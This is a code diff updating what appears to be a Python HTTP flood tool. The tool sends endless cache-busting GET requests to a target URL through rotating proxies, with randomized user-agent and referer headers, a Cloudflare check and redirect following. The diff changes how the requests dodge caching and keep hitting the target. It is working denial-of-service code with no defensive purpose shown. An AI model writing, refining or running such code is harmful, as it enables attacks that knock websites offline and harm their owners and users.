@@ -6,7 +6,7 @@ from requests.auth import HTTPBasicAuth
 from urllib.parse import urlparse
 
 #versioning
-VERSION = (0, 1, 3)
+VERSION = (0, 1, 4)
 __version__ = '%d.%d.%d' % VERSION[0:3]
 
 #if python ver < 3.5
@@ -18,13 +18,11 @@ if sys.version_info[0:2] < (3, 5):
 proxy_file = 'files/proxy.txt'
 ua_file = 'files/user-agents.txt'
 ref_file = 'files/referers.txt'
-keywords_file = 'files/keywords.txt'
 
 # initializing variables
 ex = Event()
 ips = []
 ref = []
-keyword = []
 ua = []
 timeout = 10
 proto = ''
@@ -113,43 +111,32 @@ def parseFiles():
 	except OSError:
 		print('Error: %s was not found!' % ref_file)
 		sys.exit()
-	#trying to find and parse file with keywords
-	try:
-		if os.stat(keywords_file).st_size > 0:
-			with open(keywords_file) as keywords:
-				global keyword
-				keyword = [row.rstrip() for row in keywords]
-		else:
-			print('Error: File %s is empty!' % keywords_file)
-			sys.exit()
-	except OSError:
-		print('Error: %s was not found!' % keywords_file)
-		sys.exit()
 	#parse end
 	# messaging statistics
-	print('Loaded: {} proxies, {} user-agents, {} referers, {} keywords'.format(len(ips), len(ua), len(ref), len(keyword)))
+	print('Loaded: {} proxies, {} user-agents, {} referers'.format(len(ips), len(ua), len(ref)))
 	cloudFlareCheck()
 	
 def request(index):
 	err_count = 0
-	only_gzip = 0
+	global url
 	while not ex.is_set():
-		payload = {random.choice(keyword): random.choice(keyword)}
+		timestamp = str(int(time.time()))
 		headers = {'User-Agent': random.choice(ua),
-			'Referer': random.choice(ref) + random.choice(keyword),
-			'Accept-Encoding': 'gzip;q=0,deflate;q=0' if only_gzip < 5 else 'identity, deflate, compress, gzip, sdch, br',
+			'Referer': random.choice(ref) + url,
+			'Accept-Encoding': 'gzip;q=0,deflate,sdch',
 			'Cache-Control': 'no-cache, no-store, must-revalidate',
 			'Pragma': 'no-cache'}
 		proxy = {proto: ips[index]}
 		try:
 			if auth:
-				r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
+				r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
 			else:
-				r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout)
-			if r.status_code == 406 and only_gzip < 5:
-				only_gzip += 1
+				r = requests.get(url + '?' + timestamp, headers=headers, proxies=proxy, timeout=timeout)
+			if r.status_code == 301 or r.status_code == 302 or r.status_code == 307:
+				url = r.headers['Location']
+				print('Request was redirected to {}'.format(url))
 		except requests.exceptions.ChunkedEncodingError:
-			err_count += 1
+			pass
 		except requests.exceptions.ConnectionError:
 			err_count += 1
 		except requests.exceptions.ReadTimeout:
